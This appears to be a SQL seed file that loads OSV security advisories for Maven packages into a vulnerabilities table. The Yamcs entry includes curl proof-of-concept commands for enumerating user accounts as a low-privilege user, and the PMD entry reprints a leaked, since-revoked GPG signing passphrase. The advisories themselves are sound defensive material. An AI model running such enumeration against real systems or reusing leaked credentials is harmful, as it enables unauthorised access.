INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-xg75-68x3-7p3q', 'OSV', 'org.apache.struts:struts2-core', 'maven', 'Apache Struts vulnerable to possible DoS attack when using URLValidator', 'The URLValidator class in Apache Struts 2 2.3.20 through 2.3.28.1 and 2.5.x before 2.5.13 allows remote attackers to cause a denial of service via a null value for a URL field.', '["2.5", "2.5.1", "2.5.10", "2.5.10.1", "2.5.12", "2.5.2", "2.5.5", "2.5.8"]'::jsonb, '0.0', '2022-05-17 02:16:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-5293-3fgp-cr3x', 'OSV', 'org.jenkins-ci.plugins:periodicbackup', 'maven', 'Missing permission checks in Jenkins Periodic Backup Plugin allow every user to change settings', 'The Periodic Backup Plugin did not perform any permission checks, allowing any user with Overall/Read access to change its settings, trigger backups, restore backups, download backups, and also delete all previous backups via log rotation. Additionally, the plugin was not requiring requests to its API be sent via POST, thereby opening itself to Cross-Site Request Forgery attacks.', '["1.0", "1.1", "1.2", "1.3", "1.4"]'::jsonb, '0.0', '2022-05-13 01:18:19+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-qjp4-4jvr-xqg3', 'OSV', 'org.springaicommunity:mcp-client-security', 'maven', 'Spring AI MCP Security: Unvalidated URL Fetching (SSRF)', '### Summary

The mcp-security framework fails to implement the mandatory SSRF mitigations outlined in the Model Context Protocol (MCP) [security specifications](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices#mitigation-3). Specifically, it processes untrusted URLs for OAuth-related discovery and metadata without verifying if the targets are malicious or internal to the network.

This only affects installations with Dynamic Client Registration (DCR) enabled:

```properties
spring.ai.mcp.client.authorization.dynamic-client-registration.enabled=true
```

DCR does not validate URLs exposed by MCP Servers (protected resource metadata URL, authorization server URL) and Authorization Servers (all OAuth2 endpoints).

### Workaround

When users need to perform DCR, they may provide their own `McpOAuth2ClientManager`. Both `McpMetadataDiscoveryService` and `DynamicClientRegistrationService` are also affected, if used, users should provide their own subclasses.

Alternatively, users can provide the default implementations of these classes with a `RestClient` that implements URL filtering through `ClientHttpRequestInterceptor`.', '["0.0.1", "0.0.2", "0.0.3", "0.0.4", "0.0.5", "0.0.6", "0.1.0", "0.1.1", "0.1.2", "0.1.3", "0.1.4", "0.1.5", "0.1.6", "0.1.7", "0.1.8"]'::jsonb, '0.0', '2026-05-18 13:29:29+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-rrhf-32rq-f28h', 'OSV', 'org.apache.linkis:linkis-datasource', 'maven', 'Apache Linkis DatasourceManager module has deserialization vulnerability', 'In Apache Linkis <=1.3.1, because the parameters are not effectively filtered, the attacker can use the MySQL data source and malicious parameters to configure a new data source to trigger a deserialization vulnerability, eventually leading to remote code execution. Users should upgrade their version of Linkis to version 1.3.2.', '["1.1.0", "1.1.1", "1.1.2", "1.1.3", "1.2.0", "1.3.0", "1.3.1"]'::jsonb, '0.0', '2023-04-10 09:30:15+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-p2rj-mrmc-9w29', 'OSV', 'org.yamcs:yamcs-core', 'maven', 'Yamcs vulnerable to unauthorized user enumeration via IAM API endpoints', E'### Summary

The IAM API endpoints (`listUsers`, `getUser`, `listGroups`, and `getGroup`) in `yamcs-core` do not enforce the required `SystemPrivilege.ControlAccess` check. As a result, **any authenticated user** (even those with low or no privileges) can enumerate all user accounts in the system, including their usernames, superuser status, and group memberships.

This constitutes a broken access control vulnerability (CWE-862) that leaks sensitive user information.

### Root Cause

**File:** `yamcs-core/src/main/java/org/yamcs/http/api/IamApi.java:125,180,357,372`

`listUsers()`, `getUser()`, `listGroups()`, and `getGroup()` do not require `SystemPrivilege.ControlAccess`. Any authenticated user — regardless of privileges — can enumerate all users, their superuser status, and group memberships:

```java
// listUsers — NO checkSystemPrivilege
public void listUsers(Context ctx, Empty request, ...) {
    var sensitiveDetails = ctx.user.hasSystemPrivilege(SystemPrivilege.ControlAccess);
    // sensitiveDetails=false for low-priv users, but name/superuser/active still exposed
    for (User user : users) {
        UserInfo userb = toUserInfo(user, sensitiveDetails, directory);
        responseb.addUsers(userb);
    }
}
```

Compare with properly protected endpoints:

```java
// createUser — correctly protected
public void createUser(Context ctx, ...) {
    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess); // present
```

### Impact

Any authenticated user can:

1. List all user accounts in the system
2. Identify which accounts have superuser privileges
3. Use this information to target privileged accounts

### Proof of Concept

```bash
# Authenticate as any low-privilege user GET access_token
curl -s -X POST "http://localhost:8090/auth/token" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "grant_type=password&username=lowpriv&password=lowpriv123"

# Enumerate all users — no ControlAccess required
curl -s "http://TARGET:8090/api/users" \\
  -H "Authorization: Bearer $TOKEN" #paste access_token
```

**Output (confirmed):**

```json
{
  "users": [
    { "name": "admin", "superuser": true, "active": true },
    { "name": "operator", "superuser": true, "active": true },
    { "name": "lowpriv", "superuser": false, "active": true }
  ]
}
```

### Fix

Add `ControlAccess` check to `listUsers`, `getUser`, `listGroups`, `getGroup`:

```java
public void listUsers(Context ctx, Empty request, ...) {
    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess); // ADD THIS
    ...
}
```', '["0.29.3", "0.30.0", "3.0.0", "3.1.0", "3.1.1", "3.1.2", "3.2.0", "3.2.1", "3.2.2", "3.3.0", "3.3.1", "3.4.0", "3.4.1", "3.4.11", "3.4.2", "3.4.3", "3.4.4", "3.4.5", "3.4.6", "3.4.8", "4.0.0", "4.0.1", "4.1.1", "4.1.2", "4.10.0", "4.10.1", "4.10.2", "4.10.3", "4.10.4", "4.10.5", "4.10.6", "4.10.7", "4.10.8", "4.10.9", "4.2.0", "4.2.1", "4.2.2", "4.3.0", "4.3.1", "4.4.0", "4.4.1", "4.4.2", "4.5.0", "4.6.0", "4.6.1", "4.6.2", "4.6.3", "4.7", "4.7.1", "4.7.3", "4.8.0", "4.8.1", "4.9.0", "4.9.1", "4.9.2", "4.9.3", "4.9.4", "5.0.0", "5.1.0", "5.1.1", "5.1.2", "5.1.3", "5.1.4", "5.10.0", "5.10.1", "5.10.10", "5.10.11", "5.10.12", "5.10.2", "5.10.3", "5.10.4", "5.10.5", "5.10.6", "5.10.7", "5.10.8", "5.10.9", "5.11.0", "5.11.1", "5.11.10", "5.11.11", "5.11.12", "5.11.13", "5.11.2", "5.11.3", "5.11.4", "5.11.5", "5.11.6", "5.11.7", "5.11.8", "5.11.9", "5.12.0", "5.12.1", "5.12.2", "5.12.3", "5.12.4", "5.12.5", "5.12.6", "5.2.0", "5.2.1", "5.2.2", "5.2.3", "5.2.4", "5.2.5", "5.2.6", "5.3.0", "5.3.1", "5.3.2", "5.3.3", "5.3.4", "5.3.5", "5.3.6", "5.4.0", "5.4.1", "5.4.2", "5.4.3", "5.4.4", "5.4.5", "5.5.0", "5.5.1", "5.5.2", "5.5.3", "5.5.4", "5.5.5", "5.5.6", "5.5.7", "5.6.0", "5.6.1", "5.6.2", "5.7.0", "5.7.1", "5.7.10", "5.7.11", "5.7.12", "5.7.13", "5.7.2", "5.7.3", "5.7.4", "5.7.5", "5.7.6", "5.7.7", "5.7.8", "5.7.9", "5.8.0", "5.8.1", "5.8.2", "5.8.3", "5.8.4", "5.8.5", "5.8.6", "5.8.7", "5.8.8", "5.9.0", "5.9.1", "5.9.10", "5.9.11", "5.9.12", "5.9.2", "5.9.3", "5.9.4", "5.9.5", "5.9.6", "5.9.7", "5.9.8", "5.9.8.1", "5.9.9"]'::jsonb, '0.0', '2026-05-27 00:03:56+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-5xhh-6xfv-7q42', 'OSV', 'org.jenkins-ci.plugins:bearychat', 'maven', 'Cross-site request forgery vulnerability in Jenkins BearyChat Plugin', 'A cross-site request forgery (CSRF) vulnerability in Jenkins BearyChat Plugin 3.0.2 and earlier allows attackers to connect to an attacker-specified URL.', '["1.0", "1.2", "1.3", "1.4", "2.0", "2.1", "2.2", "3.0-SHAPSHOT", "3.0.1", "3.0.2"]'::jsonb, '0.0', '2023-01-26 21:30:17+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-8v5q-rhf3-jphm', 'OSV', 'org.springframework.security:spring-security-core', 'maven', 'Spring Security annotation detection mechanism has authorization bypass', 'The Spring Security annotation detection mechanism may not correctly resolve annotations on methods within type hierarchies with a parameterized super type with unbounded generics. This can be an issue when using @PreAuthorize and other method security annotations, resulting in an authorization bypass.

Your application may be affected by this if you are using Spring Security''s @EnableMethodSecurity feature.

You are not affected by this if you are not using @EnableMethodSecurity or if you do not use security annotations on methods in generic superclasses or generic interfaces.

This CVE is published in conjunction with  CVE-2025-41249 https://spring.io/security/cve-2025-41249 .', '["6.5.0", "6.5.1", "6.5.2", "6.5.3"]'::jsonb, '0.0', '2025-09-16 15:32:34+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-9j65-3f2q-8q2r', 'OSV', 'org.jenkins-ci.plugins:pipeline-build-step', 'maven', 'Cross-site Scripting in Jenkins Pipeline: Build Step Plugin', 'Jenkins Pipeline: Build Step Plugin 2.18 and earlier does not escape job names in a JavaScript expression used in the Pipeline Snippet Generator, resulting in a stored cross-site scripting (XSS) vulnerability exploitable by attackers able to control job names.', '["2.0", "2.1", "2.10", "2.11", "2.12", "2.13", "2.13.1", "2.14", "2.15", "2.15.1", "2.15.2", "2.16", "2.17", "2.18", "2.2", "2.3", "2.4", "2.5", "2.5.1", "2.6", "2.7", "2.8", "2.9"]'::jsonb, '0.0', '2023-02-15 15:30:41+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-2326-hx7g-3m9r', 'OSV', 'org.apache.sshd:sshd-common', 'maven', 'Apache MINA SSHD: integrity check bypass', 'Like many other SSH implementations, Apache MINA SSHD suffered from the issue that is more widely known as CVE-2023-48795. An attacker that can intercept traffic between client and server could drop certain packets from the stream, potentially causing client and server to consequently end up with a connection for which 
some security features have been downgraded or disabled, aka a Terrapin 
attack

The mitigations to prevent this type of attack were implemented in Apache MINA SSHD 2.12.0, both client and server side. Users are recommended to upgrade to at least this version. Note that both the client and the server implementation must have mitigations applied against this issue, otherwise the connection may still be affected.', '["2.1.0", "2.10.0", "2.11.0", "2.2.0", "2.3.0", "2.4.0", "2.5.0", "2.5.1", "2.6.0", "2.7.0", "2.8.0", "2.9.0", "2.9.1", "2.9.2", "2.9.3"]'::jsonb, '0.0', '2024-08-12 18:30:47+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-f8r7-7hv9-7f43', 'OSV', 'org.jenkins-ci.plugins:cas-plugin', 'maven', 'Jenkins CAS Plugin Server-Side Request Forgery vulnerability', 'A server-side request forgery vulnerability exists in Jenkins CAS Plugin 1.4.1 and older in CasSecurityRealm.java that allows attackers with Overall/Read access to cause Jenkins to send a GET request to a specified URL. Additionally, this form validation method did not require POST requests, resulting in a CSRF vulnerability. As of version 1.4.2, this form validation method requires POST requests and the Overall/Administer permission.', '["1.0.0", "1.1.0", "1.1.1", "1.1.2", "1.2.0", "1.3.0", "1.4.0", "1.4.1"]'::jsonb, '0.0', '2022-05-14 03:13:13+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-52mh-p2m2-w625', 'OSV', 'ca.uhn.hapi.fhir:hapi-fhir-base', 'maven', 'Cross-site Scripting in HAPI FHIR', 'XSS exists in the HAPI FHIR testpage overlay module of the HAPI FHIR library before 3.8.0. The attack involves unsanitized HTTP parameters being output in a form page, allowing attackers to leak cookies and other sensitive information from ca/uhn/fhir/to/BaseController.java via a specially crafted URL. (This module is not generally used in production systems so the attack surface is expected to be low, but affected systems are recommended to upgrade immediately.)', '["0.1", "0.2", "0.3", "0.4", "0.5", "0.6", "0.7", "0.8", "0.9", "1.0", "1.1", "1.2", "1.3", "1.4", "1.5", "1.6", "2.0", "2.1", "2.2", "2.3", "2.4", "2.5", "3.0.0", "3.1.0", "3.2.0", "3.3.0", "3.4.0", "3.5.0", "3.6.0", "3.7.0"]'::jsonb, '0.0', '2019-06-07 20:56:59+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-4px2-gqhv-mrc7', 'OSV', 'org.opendaylight.integration:distribution-karaf', 'maven', 'Password change doesn''t result in Karaf clearing cache', 'OpenDaylight Karaf 0.6.1-Carbon fails to clear the cache after a password change, allowing the old password to be used until the Karaf cache is manually cleared (e.g. via restart).', '["0.2.0-Helium", "0.2.1-Helium-SR1", "0.2.1-Helium-SR1.1", "0.2.2-Helium-SR2", "0.2.3-Helium-SR3", "0.2.4-Helium-SR4", "0.3.0-Lithium", "0.3.1-Lithium-SR1", "0.3.2-Lithium-SR2", "0.3.3-Lithium-SR3", "0.3.4-Lithium-SR4", "0.4.0-Beryllium", "0.4.1-Beryllium-SR1", "0.4.2-Beryllium-SR2", "0.4.3-Beryllium-SR3", "0.4.4-Beryllium-SR4", "0.5.0-Boron", "0.5.1-Boron-SR1", "0.5.2-Boron-SR2", "0.5.3-Boron-SR3", "0.5.4-Boron-SR4", "0.6.0-Carbon", "0.6.1-Carbon", "0.6.2-Carbon", "0.6.3-Carbon", "0.6.4-Carbon"]'::jsonb, '0.0', '2022-05-17 00:12:25+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-8cr3-vpxx-92cx', 'OSV', 'org.keycloak:keycloak-broker-saml', 'maven', 'Keycloak SAML Broken has Authentication Bypass by Primary Weakness', 'A flaw was found in org.keycloak.broker.saml. When a disabled Security Assertion Markup Language (SAML) client is configured as an Identity Provider (IdP)-initiated broker landing target, it can still complete the login process and establish a Single Sign-On (SSO) session. This allows a remote attacker to gain unauthorized access to other enabled clients without re-authentication, effectively bypassing security restrictions.

A fix is available at https://github.com/keycloak/keycloak/releases/tag/26.5.5.', '["1.2.0.Beta1", "1.2.0.CR1", "1.2.0.Final", "1.3.0.Final", "1.3.1.Final", "1.4.0.Final", "1.5.0-Final", "1.5.0.Final", "1.5.1.Final", "1.6.0.Final", "1.6.1.Final", "1.7.0.CR1", "1.7.0.Final", "1.8.0.Alpha1", "1.8.0.CR1", "1.8.0.CR2", "1.8.0.CR3", "1.8.0.Final", "1.8.1.Final"]'::jsonb, '0.0', '2026-03-05 21:30:48+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-88m4-h43f-wx84', 'OSV', 'net.sourceforge.pmd:pmd-designer', 'maven', 'PMD Designer''s release key passphrase (GPG) available on Maven Central in cleartext', '### Summary
While rebuilding [PMD Designer](https://github.com/pmd/pmd-designer) for Reproducible Builds and digging into issues, I found out that passphrase for `gpg.keyname=0xD0BF1D737C9A1C22` is included in jar published to Maven Central.

### Details
See https://github.com/jvm-repo-rebuild/reproducible-central/blob/master/content/net/sourceforge/pmd/pmd-designer/README.md

I removed 2 lines from https://github.com/jvm-repo-rebuild/reproducible-central/blob/master/content/net/sourceforge/pmd/pmd-designer/pmd-designer-7.0.0.diffoscope but real content is:

```
├── net/sourceforge/pmd/util/fxdesigner/designer.properties
│ @@ -1,14 +1,12 @@
│  #Properties
│  checkstyle.plugin.version=3.3.1
│  checkstyle.version=10.14.0
│ -gpg.keyname=0xD0BF1D737C9A1C22
│ -gpg.passphrase=evicx0nuPfvSVhVyeXpw
│  jar.plugin.version=3.3.0
│ -java.version=11.0.22
│ +java.version=11.0.25
│  javadoc.plugin.version=3.6.3
│  jflex-output=/home/runner/work/pmd-designer/pmd-designer/target/generated-sources/jflex
│  junit5.version=5.8.2
│  kotest.version=5.5.5
│  kotlin.version=1.7.20
│  local.lib.repo=/home/runner/work/pmd-designer/pmd-designer/lib/mvn-repo
│  openjfx.scope=provided
```

### PoC
```
./rebuild.sh content/net/sourceforge/pmd/pmd-designer/pmd-designer-7.0.0.buildspec
```

### Impact
After further analysis, the passphrase of the following two keys have been compromised:

1. `94A5 2756 9CAF 7A47 AFCA  BDE4 86D3 7ECA 8C2E 4C5B`: PMD Designer (Release Signing Key) <releases@pmd-code.org>
   This key has been used since 2019 with the release of [net.sourceforge.pmd:pmd-ui:6.14.0](https://repo.maven.apache.org/maven2/net/sourceforge/pmd/pmd-ui/6.14.0/).
   The following versions are signed with the same key: 6.16.0, 6.17.0, 6.19.0.
2. `EBB2 41A5 45CB 17C8 7FAC  B2EB D0BF 1D73 7C9A 1C22`: PMD Release Signing Key <releases@pmd-code.org>
   This key has been used since 2020 with the release of [net.sourceforge.pmd:pmd-ui:6.21.0](https://repo.maven.apache.org/maven2/net/sourceforge/pmd/pmd-ui/6.21.0/)
   and all the other modules of PMD such as [net.sourceforge.pmd:pmd-core:6.21.0](https://repo.maven.apache.org/maven2/net/sourceforge/pmd/pmd-core/6.21.0/).  
   This key has also been used for PMD 7, for the designer, e.g. [net.sourceforge.pmd:pmd-designer:7.0.0](https://repo.maven.apache.org/maven2/net/sourceforge/pmd/pmd-designer/7.0.0/)
   and [net.sourceforge.pmd:pmd-core:7.0.0](https://repo.maven.apache.org/maven2/net/sourceforge/pmd/pmd-core/7.0.0/).
   The versions between 6.21.0 and 7.9.0 are signed with this key.  
   Additionally the key has been used to sign the last release of [PMD Eclipse Plugin 7.9.0.v20241227-1626-r](https://github.com/pmd/pmd-eclipse-plugin/releases/tag/7.9.0.v20241227-1626-r).

The keys have been used exclusively for signing artifacts that we published to Maven Central under group id `net.sourceforge.pmd` and once for our pmd-eclipse-plugin. The private key itself is not known to have been compromised itself, but given its passphrase is, it must also be considered potentially compromised.

As a mitigation, both compromised keys have been revoked so that no future use of the keys are possible.
For future releases of PMD, PMD Designer and PMD Eclipse Plugin we use a new release signing key:
`2EFA 55D0 785C 31F9 56F2  F87E A0B5 CA1A 4E08 6838` (PMD Release Signing Key <releases@pmd-code.org>).

Note, that the published artifacts in Maven Central under the group id `net.sourceforge.pmd` are **not**
compromised and the signatures are valid. No other past usages of the private key is known to the project
and no future use is possible due to the revocation. If anybody finds a past abuse of the private key,
please share with us.

Note, the module `net.sourceforge.pmd:pmd-ui` has been renamed to `net.sourceforge.pmd:pmd-designer` since PMD 7, so there won''t be a fixed version for `pmd-ui`.

### Fixes
* Reworked build script in PMD Designer to not include all system properties
  * https://github.com/pmd/pmd-designer/commit/1548f5f27ba2981b890827fecbd0612fa70a0362
  * https://github.com/pmd/pmd-designer/commit/e87a45312753ec46b3e5576c6f6ac1f7de2f5891

### References

* [GHSA-88m4-h43f-wx84](https://github.com/pmd/pmd/security/advisories/GHSA-88m4-h43f-wx84)
* [CVE-2025-23215](https://www.cve.org/CVERecord?id=CVE-2025-23215)
* [reproducible-central](https://github.com/jvm-repo-rebuild/reproducible-central?tab=readme-ov-file#reproducible-builds-for-maven-central-repository)', '["6.21.0", "6.22.0", "6.23.0", "6.24.0", "6.25.0", "6.26.0", "6.27.0", "6.28.0", "6.29.0", "6.30.0", "6.31.0", "6.32.0", "6.33.0", "6.34.0", "6.35.0", "6.36.0", "6.37.0", "6.38.0", "6.39.0", "6.40.0", "6.41.0", "6.42.0", "6.43.0", "6.44.0", "6.45.0", "6.46.0", "6.47.0", "6.48.0", "6.49.0", "6.50.0", "6.51.0", "6.52.0", "6.53.0", "6.54.0", "6.55.0", "7.0.0", "7.0.0-rc1", "7.0.0-rc2", "7.0.0-rc3", "7.0.0-rc4", "7.1.0", "7.2.0", "7.3.0", "7.4.0", "7.5.0", "7.6.0", "7.7.0", "7.8.0", "7.9.0"]'::jsonb, '0.0', '2025-01-31 17:34:09+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-8q89-pwhh-7wfq', 'OSV', 'com.github.penggle:kaptcha', 'maven', 'Use of Insufficiently Random Values in penggle:kaptcha', 'text/impl/DefaultTextCreator.java, text/impl/ChineseTextProducer.java, and text/impl/FiveLetterFirstNameTextCreator.java in kaptcha 2.3.2 use the Random (rather than SecureRandom) function for generating CAPTCHA values, which makes it easier for remote attackers to bypass intended access restrictions via a brute-force approach.', '["2.3.2"]'::jsonb, '0.0', '2018-10-23 16:08:56+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-9f57-9rhg-4hvm', 'OSV', 'tech.kwik:kwik', 'maven', 'Kwik hash collision vulnerability', 'An issue was discovered in Kwik before 0.10.1. A hash collision vulnerability (in the hash table used to manage connections) allows remote attackers to cause a considerable CPU load on the server (a Hash DoS attack) by initiating connections with colliding Source Connection IDs (SCIDs).', '["0.10", "0.8.10", "0.8.11", "0.8.12", "0.8.13", "0.8.3", "0.8.4", "0.8.5", "0.8.6", "0.8.7", "0.8.8", "0.8.9", "0.9", "0.9.1"]'::jsonb, '0.0', '2025-02-20 03:32:03+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-p9qj-4rjp-j3w9', 'OSV', 'org.apache.directory.studio:org.apache.directory.studio.ldapbrowser.core', 'maven', 'Apache Directory Studio Command Injection', 'The CSV export in Apache LDAP Studio and Apache Directory Studio before 2.0.0-M10 does not properly escape field values, which might allow attackers to execute arbitrary commands by leveraging a crafted LDAP entry that is interpreted as a formula when imported into a spreadsheet.', '["2.0.0.v20150606-M9"]'::jsonb, '0.0', '2022-05-13 01:07:08+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-x97g-3gp9-cf2p', 'OSV', 'org.jenkins-ci.main:jenkins-core', 'maven', 'Jenkins allows Cross-Site Scripting (XSS) via Crafted URL', 'Cross-site Scripting (XSS) in Jenkins main before 1.482 and LTS before 1.466.2 allows remote attackers to inject arbitrary web script or HTML via a crafted URL that points to Jenkins.', '["1.467", "1.468", "1.469", "1.470", "1.471", "1.472", "1.473", "1.474", "1.475", "1.476", "1.477", "1.478", "1.479", "1.480", "1.480.1", "1.480.2", "1.480.3", "1.481"]'::jsonb, '0.0', '2022-04-23 00:40:12+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-9gr7-gh74-qg9x', 'OSV', 'org.apache.streampipes:streampipes-parent', 'maven', 'Apache StreamPipes has possibility of SSRF in pipeline element installation process', 'Server-Side Request Forgery (SSRF) vulnerability in Apache StreamPipes during installation process of pipeline elements.
Previously, StreamPipes allowed users to configure custom endpoints from which to install additional pipeline elements. 
These endpoints were not properly validated, allowing an attacker to get StreamPipes to send an HTTP GET request to an arbitrary address.

This issue affects Apache StreamPipes: through 0.93.0.

Users are recommended to upgrade to version 0.95.0, which fixes the issue.', '["0.0.2.dev0", "0.91.0", "0.92.0", "0.93.0"]'::jsonb, '0.0', '2024-07-17 09:30:49+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-x3p3-929j-pq66', 'OSV', 'org.jenkins-ci.main:jenkins-core', 'maven', 'Improper Neutralization of Input During Web Page Generation in Jenkins', 'Cross-site scripting (XSS) vulnerability in Jenkins before 1.640 and LTS before 1.625.2 allows remote authenticated users to inject arbitrary web script or HTML via unspecified vectors related to workspaces and archived artifacts.', '["1.396", "1.397", "1.398", "1.399", "1.400", "1.401", "1.403", "1.404", "1.405", "1.406", "1.407", "1.408", "1.409", "1.409.1", "1.409.2", "1.409.3", "1.410", "1.411", "1.412", "1.413", "1.414", "1.415", "1.416", "1.417", "1.418", "1.419", "1.420", "1.421", "1.422", "1.423", "1.424", "1.424.1", "1.424.2", "1.424.3", "1.424.4", "1.424.5", "1.424.6", "1.425", "1.426", "1.427", "1.428", "1.429", "1.430", "1.431", "1.432", "1.433", "1.434", "1.435", "1.436", "1.437", "1.438", "1.439", "1.440", "1.441", "1.442", "1.443", "1.444", "1.445", "1.446", "1.447", "1.447.1", "1.447.2", "1.448", "1.449", "1.450", "1.451", "1.452", "1.453", "1.454", "1.455", "1.456", "1.457", "1.458", "1.459", "1.460", "1.461", "1.462", "1.463", "1.464", "1.465", "1.466", "1.466.1", "1.466.2", "1.467", "1.468", "1.469", "1.470", "1.471", "1.472", "1.473", "1.474", "1.475", "1.476", "1.477", "1.478", "1.479", "1.480", "1.480.1", "1.480.2", "1.480.3", "1.481", "1.482", "1.483", "1.484", "1.485", "1.486", "1.487", "1.488", "1.489", "1.490", "1.491", "1.492", "1.493", "1.494", "1.495", "1.496", "1.497", "1.498", "1.499", "1.500", "1.501", "1.502", "1.503", "1.504", "1.505", "1.506", "1.507", "1.508", "1.509", "1.509.1", "1.509.2", "1.509.2.JENKINS-14362-jzlib", "1.509.2.JENKINS-8856-diag", "1.509.3", "1.509.3.JENKINS-14362-jzlib", "1.509.4", "1.510", "1.511", "1.512", "1.513", "1.514", "1.515", "1.516", "1.516.JENKINS-14362-jzlib", "1.517", "1.518", "1.518.JENKINS-14362-jzlib", "1.519", "1.520", "1.521", "1.522", "1.523", "1.524", "1.525", "1.526", "1.527", "1.528", "1.529", "1.530", "1.531", "1.532", "1.532.1", "1.532.1.JENKINS-19453", "1.532.2", "1.532.2.JENKINS-21622-diag", "1.532.2.JENKINS-22395-diag", "1.532.3", "1.532.3.JENKINS-22395", "1.532.3.JENKINS-22395-2", "1.533", "1.534", "1.535", "1.536", "1.537", "1.538", "1.539", "1.540", "1.541", "1.542", "1.543", "1.544", "1.545", "1.546", "1.547", "1.548", "1.549", "1.550", "1.551", "1.552", "1.553", "1.554", "1.554.1", "1.554.2", "1.554.3", "1.554.3.JENKINS-18065-ALLRM-all", "1.554.3.JENKINS-18065-JENKINS-23945", "1.555", "1.556", "1.557", "1.558", "1.559", "1.560", "1.561", "1.562", "1.563", "1.564", "1.565", "1.565.1", "1.565.1.JENKINS-22395-dropLinks", "1.565.2", "1.565.3", "1.566", "1.567", "1.568", "1.569", "1.570", "1.571", "1.572", "1.573", "1.574", "1.575", "1.576", "1.577", "1.578", "1.579", "1.580", "1.580.1", "1.580.2", "1.580.3", "1.581", "1.582", "1.583", "1.584", "1.585", "1.586", "1.587", "1.588", "1.589", "1.590", "1.591", "1.592", "1.593", "1.594", "1.595", "1.596", "1.596.1", "1.596.2", "1.596.3", "1.597", "1.598", "1.599", "1.600", "1.601", "1.602", "1.604", "1.605", "1.606", "1.607", "1.608", "1.609", "1.609.1", "1.609.2", "1.609.3", "1.610", "1.611", "1.612", "1.613", "1.614", "1.615", "1.616", "1.617", "1.618", "1.619", "1.620", "1.621", "1.622", "1.623", "1.624", "1.625", "1.625.1"]'::jsonb, '0.0', '2022-05-17 03:53:41+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-3cjc-vhfm-ffp2', 'OSV', 'org.apache.dolphinscheduler:dolphinscheduler', 'maven', 'Apache DolphinScheduler vulnerable to sensitive information disclosure', 'An Exposure of Sensitive Information to an Unauthorized Actor vulnerability exists in Apache DolphinScheduler.

This vulnerability may allow unauthorized actors to access sensitive information, including database credentials.


This issue affects Apache DolphinScheduler versions 3.1.*.


Users are recommended to upgrade to:

  *  version ≥ 3.2.0 if using 3.1.x

As a temporary workaround, users who cannot upgrade immediately may restrict the exposed management endpoints by setting the following environment variable:


```
MANAGEMENT_ENDPOINTS_WEB_EXPOSURE_INCLUDE=health,metrics,prometheus
```

Alternatively, add the following configuration to the application.yaml file:


```
management:
   endpoints:
     web:
        exposure:
          include: health,metrics,prometheus
```

This issue has been reported as CVE-2023-48796:

 https://cveprocess.apache.org/cve5/CVE-2023-48796', '["3.1.0", "3.1.1", "3.1.2", "3.1.3", "3.1.4", "3.1.5", "3.1.6", "3.1.7", "3.1.8", "3.1.9"]'::jsonb, '0.0', '2026-04-09 12:31:10+00') ON CONFLICT (id) DO NOTHING;
